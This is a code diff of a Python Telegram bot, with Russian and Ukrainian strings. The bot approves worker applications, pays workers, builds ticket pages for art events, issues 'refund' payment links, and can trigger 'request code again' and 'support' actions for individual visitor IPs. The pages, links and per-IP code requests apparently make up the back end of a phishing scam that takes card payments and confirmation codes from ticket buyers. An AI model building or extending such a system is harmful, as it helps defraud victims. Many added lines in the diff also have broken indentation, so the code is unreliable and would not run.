@@ -391,7 +391,7 @@ async def process_experience(message: types.Message):
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
-    uid = message.from_user.id
+        uid = message.from_user.id
     print(f"[DEBUG] skip_screenshots handler triggered for user {uid}, user_step: {user_step.get(uid)}")
     print(f"[DEBUG] Message text: '{message.text}'")
     if user_step.get(uid) == 'screenshots':
@@ -477,10 +477,10 @@ async def finish_form(message):
     )
     try:
         print(f"[DEBUG] Sending message to ADMIN_GROUP_ID: {ADMIN_GROUP_ID}")
-        await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
+    await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
         print(f"[DEBUG] Admin message sent successfully")
         for ph in screenshots:
-            await bot.send_photo(ADMIN_GROUP_ID, ph)
+        await bot.send_photo(ADMIN_GROUP_ID, ph)
             print(f"[DEBUG] Sending confirmation to user")
     except Exception as e:
         print(f"[ERROR] Sending to admin or user failed: {e}")
@@ -654,8 +654,9 @@ async def admin_panel_action(message: types.Message):
         await message.answer("Платежка включена для всех пользователей.")
     elif message.text == "Прямая оплата":
         user_step[message.from_user.id] = 'manual_payment_amount'
-        print(f"[DEBUG] admin_panel_action: set user_step to manual_payment_amount for {message.from_user.id}")
         await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):")
+        # Тут логіка для прямої оплати
+        # await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
 
     else:
         pass  # Відповідь на невідому команду тепер тільки у fallback-хендлері
@@ -1041,7 +1042,7 @@ async def handle_links_menu(message: types.Message):
         "Минимальная стоимость для Австралии - 110 AUD"
     )
         await message.answer(template_text, reply_markup=links_template_kb)
-        user_step[message.chat.id] = 'event_all_fields'
+    user_step[message.chat.id] = 'event_all_fields'
     elif text == "изменить ссылки":
         # --- Показати список останніх 50 page_code з номерами як ?page=13-140 ---
         c = conn.cursor()
@@ -1284,7 +1285,55 @@ async def admin_enter_text(message: types.Message):
     await message.answer("Кнопка з текстом з'явиться на сайті користувача.")
     user_step[message.from_user.id] = None
 
-
+@router.message()
+async def block_others(message: types.Message):
+    uid = message.from_user.id
+    print(f"[block_others] uid={uid}, user_step={user_step.get(uid)}, text={message.text!r}")
+    # Якщо повідомлення схоже на оплату (число + валюта) і це адмін — надсилаємо посилання
+    if is_admin(uid):
+        m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
+        if m:
+            amount = m.group(1).replace(',', '.')
+            currency = m.group(2).upper()
+            link = f"https://artpullse.com/refund/?total={amount}{currency}"
+            await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
+            return
+    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
+    # Ігноруємо всі кроки сценарію івентів та всі варіанти кнопки 'Ссылки'
+    if message.text and 'ссылки' in message.text.lower():
+        return
+    if user_step.get(message.from_user.id) in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
+        return
+    db_user = get_user(uid)
+    if db_user and db_user['form_json'].get('banned', False):
+        await message.answer(
+            "Ви заблоковані адміністратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не вказана')
+        )
+        return
+    if message.text in ["⚙️Меню", "📎Ссылки", "🎫Билеты", "Добавить/Изменить кошелек", "Сменить псевдоним"]:
+        return
+    if message.text and message.text == '/start':
+        return
+    if is_admin(uid):
+        if message.text in ["🛠️ Админ панель", "🚫 Заблокировать / разблокировать", "💸 Начислить выплату", "⬅️ Назад"]:
+            return
+        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount']:
+            return
+    if db_user and db_user['status'] != 'approved':
+        if db_user['status'] == 'pending':
+            await message.answer("Ваша заявка уже отправлена, ожидайте проверки.")
+        elif db_user['status'] == 'rejected':
+            if db_user['last_submit']:
+                last = datetime.fromisoformat(db_user['last_submit'])
+                if datetime.utcnow() - last < timedelta(days=7):
+                    next_time = last + timedelta(days=7)
+                    await message.answer(f"Ваша заявка была отклонена. Повторно подать заявку можно {next_time.strftime('%d.%m.%Y %H:%M')}")
+                    return
+            await message.answer("Ваша заявка отклонена.")
+        else:
+            await message.answer("Для начала заполните анкету командой /start")
+    elif not db_user:
+        await message.answer("Для начала заполните анкету командой /start")
 
 # --- EVENTS ART BOT (ex-bot.py) ---
 EVENTS_FILE = os.path.join('events-art.com', 'events.json')
@@ -1331,70 +1380,70 @@ async def events_start(message: types.Message):
 async def events_save_all(message):
     chat_id = message.chat.id
     try:
-        event_id = str(uuid.uuid4())
-        short_event_id = event_id[:6]
-        events_file = os.path.join('events-art.com', 'events.json')
-        # Завантажуємо існуючі події
-        try:
-            with open(events_file, 'r', encoding='utf-8') as f:
-                events = json.load(f)
+    event_id = str(uuid.uuid4())
+    short_event_id = event_id[:6]
+    events_file = os.path.join('events-art.com', 'events.json')
+    # Завантажуємо існуючі події
+    try:
+        with open(events_file, 'r', encoding='utf-8') as f:
+            events = json.load(f)
         except Exception as e:
             print(f"[EVENTS] Не вдалося прочитати events.json: {e}")
-            events = {}
-        # Додаємо нову подію
+        events = {}
+    # Додаємо нову подію
         user_event = EVENT_user_data.get(chat_id)
         if not user_event:
             await message.answer("❗️ Дані івенту не знайдено. Спробуйте ще раз з початку.")
             print(f"[EVENTS] EVENT_user_data порожній для chat_id={chat_id}")
             return
-        events[event_id] = {
-            'title': user_event.get('title', 'Выставка'),
-            'price': user_event.get('price', '45'),
-            'currency': user_event.get('currency', 'EUR'),
-            'address': user_event.get('address', ''),
-            'events': [
-                {
-                    'name': EVENT_FIXED_EVENTS[i],
-                    'path': EVENT_FIXED_PATHS[i],
-                    'date': user_event['dates'][i],
-                    'time': user_event['times'][i]
-                } for i in range(8)
-            ]
-        }
-        with open(events_file, 'w', encoding='utf-8') as f:
-            json.dump(events, f, ensure_ascii=False, indent=2)
-        # --- Створюємо запис у site_users ---
-        price = user_event.get('price', '45')
-        currency = user_event.get('currency', 'EUR')
-        street = user_event.get('address', '')
-        dates = user_event.get('dates', [''] * 8)
-        times = user_event.get('times', [''] * 8)
-        # Об'єднуємо дату і час у формат "дата час"
-        combined_dates = []
-        for i in range(8):
-            if dates[i] and times[i]:
-                combined_dates.append(f"{dates[i]} {times[i]}")
-            else:
-                combined_dates.append(dates[i] if dates[i] else '')
+    events[event_id] = {
+        'title': user_event.get('title', 'Выставка'),
+        'price': user_event.get('price', '45'),
+        'currency': user_event.get('currency', 'EUR'),
+        'address': user_event.get('address', ''),
+        'events': [
+            {
+                'name': EVENT_FIXED_EVENTS[i],
+                'path': EVENT_FIXED_PATHS[i],
+                'date': user_event['dates'][i],
+                'time': user_event['times'][i]
+            } for i in range(8)
+        ]
+    }
+    with open(events_file, 'w', encoding='utf-8') as f:
+        json.dump(events, f, ensure_ascii=False, indent=2)
+    # --- Створюємо запис у site_users ---
+    price = user_event.get('price', '45')
+    currency = user_event.get('currency', 'EUR')
+    street = user_event.get('address', '')
+    dates = user_event.get('dates', [''] * 8)
+    times = user_event.get('times', [''] * 8)
+    # Об'єднуємо дату і час у формат "дата час"
+    combined_dates = []
+    for i in range(8):
+        if dates[i] and times[i]:
+            combined_dates.append(f"{dates[i]} {times[i]}")
+        else:
+            combined_dates.append(dates[i] if dates[i] else '')
         site_user_id, page_code = create_site_user(combined_dates, currency, street, price)
-        # Формуємо повідомлення з посиланнями
-        msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
+    # Формуємо повідомлення з посиланнями
+    msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
         msg += f"💵 Цена: <b>{price} {currency}</b>\n"
-        msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
+    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
         msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n"
         msg += f"🔖 Page Code: <code>{page_code}</code>\n\n"
-        msg += f"<b>Афиша:</b>\n"
+    msg += f"<b>Афиша:</b>\n"
         msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?page={page_code}\n"
-        for idx, ev in enumerate(events[event_id]['events'], 1):
-            path = ev['path']
-            if path.endswith('/index.html'):
-                path = path[:-10]
+    for idx, ev in enumerate(events[event_id]['events'], 1):
+        path = ev['path']
+        if path.endswith('/index.html'):
+            path = path[:-10]
             link = f"http://{EVENT_DOMAIN}/{path}?page={page_code}"
-            msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
-        await message.answer(msg, parse_mode='HTML')
-        # Повертаємо меню після створення виставки
-        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
-        await message.answer("Головне меню:", reply_markup=kb)
+        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
+    await message.answer(msg, parse_mode='HTML')
+    # Повертаємо меню після створення виставки
+    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+    await message.answer("Головне меню:", reply_markup=kb)
         # Зберігаємо зв'язок page_code <-> user_id (Telegram user_id, а не site_user_id)
         c = conn.cursor()
         c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, message.from_user.id))
@@ -1564,7 +1613,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач розблокований")
     elif action == 'support':
         # Надсилаємо POST на /set_support_flag
-        async with aiohttp_client.ClientSession() as session:
+    async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
@@ -1572,7 +1621,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         user_step[call.from_user.id] = f'text_for_{ip}'
     elif action == 'code_request_again':
         # Надсилаємо POST на /set_request_again з кодом
-        async with aiohttp_client.ClientSession() as session:
+    async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
 
@@ -1881,19 +1930,20 @@ async def admin_pay_amount(message: types.Message):
 async def manual_payment_back(message: types.Message):
     try:
         print(f"[DEBUG] manual_payment_back: text={message.text!r}, user_step={user_step.get(message.from_user.id)}")
-        uid = message.from_user.id
         if message.text and "назад" in message.text.lower():
+            uid = message.from_user.id
             user_step[uid] = 'admin_panel'
             await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
             return
         m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
+        uid = message.from_user.id
         if m:
             amount = m.group(1).replace(',', '.')
             currency = m.group(2).upper()
             link = f"https://artpullse.com/refund/?total={amount}{currency}"
-            await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=admin_panel_kb)
+            await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             user_step[uid] = 'admin_panel'
-            print(f"[DEBUG] user_step for {uid} set to 'admin_panel' after manual payment")
+            await message.answer("Ви повернуті в адмін-панель.", reply_markup=admin_panel_kb)
         else:
             await message.answer("Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):")
     except Exception as e:
@@ -1910,71 +1960,4 @@ async def force_admin_back(message: types.Message):
     return
 
 
-@router.message()
-async def block_others(message: types.Message):
-    uid = message.from_user.id
-    step = user_step.get(uid)
-    print(f"[block_others] uid={uid}, user_step={step}, text={message.text!r}")
 
-    # Якщо зараз сценарій прямої оплати — нічого не робимо
-    if step == 'manual_payment_amount':
-        return
-
-    # Якщо user_step не 'admin_panel', скидаємо на 'admin_panel' і показуємо меню
-    if step != 'admin_panel':
-        user_step[uid] = 'admin_panel'
-        await message.answer("Вас повернуто в адмін-панель.", reply_markup=admin_panel_kb)
-        return
-
-    # Якщо адмін у адмін-панелі вводить число+валюта — підказка
-    if is_admin(uid) and step == 'admin_panel':
-        m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
-        if m:
-            await message.answer("Щоб створити посилання для оплати, спочатку натисніть 'Пряма оплата'.")
-            return
-    # Якщо завис у якомусь кроці, скидаємо і повідомляємо
-    if step not in [None, 'admin_panel']:
-        print(f"[block_others] user_step завис у '{step}', скидаю на None")
-        user_step[uid] = None
-        await message.answer("⚠️ Виникла помилка стану. Крок скинуто. Спробуйте ще раз або натисніть 'Админ панель'.")
-        return
-    # Якщо повідомлення схоже на оплату (число + валюта) і це адмін — надсилаємо посилання
-
-    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
-    # Ігноруємо всі кроки сценарію івентів та всі варіанти кнопки 'Ссылки'
-    if message.text and 'ссылки' in message.text.lower():
-        return
-    if user_step.get(message.from_user.id) in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
-        return
-    db_user = get_user(uid)
-    if db_user and db_user['form_json'].get('banned', False):
-        await message.answer(
-            "Ви заблоковані адміністратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не вказана')
-        )
-        return
-    if message.text in ["⚙️Меню", "📎Ссылки", "🎫Билеты", "Добавить/Изменить кошелек", "Сменить псевдоним"]:
-        return
-    if message.text and message.text == '/start':
-        return
-    if is_admin(uid):
-        if message.text in ["🛠️ Админ панель", "🚫 Заблокировать / разблокировать", "💸 Начислить выплату", "⬅️ Назад"]:
-            return
-        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount']:
-            return
-    if db_user and db_user['status'] != 'approved':
-        if db_user['status'] == 'pending':
-            await message.answer("Ваша заявка уже отправлена, ожидайте проверки.")
-        elif db_user['status'] == 'rejected':
-            if db_user['last_submit']:
-                last = datetime.fromisoformat(db_user['last_submit'])
-                if datetime.utcnow() - last < timedelta(days=7):
-                    next_time = last + timedelta(days=7)
-                    await message.answer(f"Ваша заявка была отклонена. Повторно подать заявку можно {next_time.strftime('%d.%m.%Y %H:%M')}")
-                    return
-            await message.answer("Ваша заявка отклонена.")
-        else:
-            await message.answer("Для начала заполните анкету командой /start")
-    elif not db_user:
-        await message.answer("Для начала заполните анкету командой /start")
-    # Якщо повідомлення схоже на оплату (число + валюта) і це адмін — обробляємо тільки якщо user_step == 'manual_payment_amount'
-  
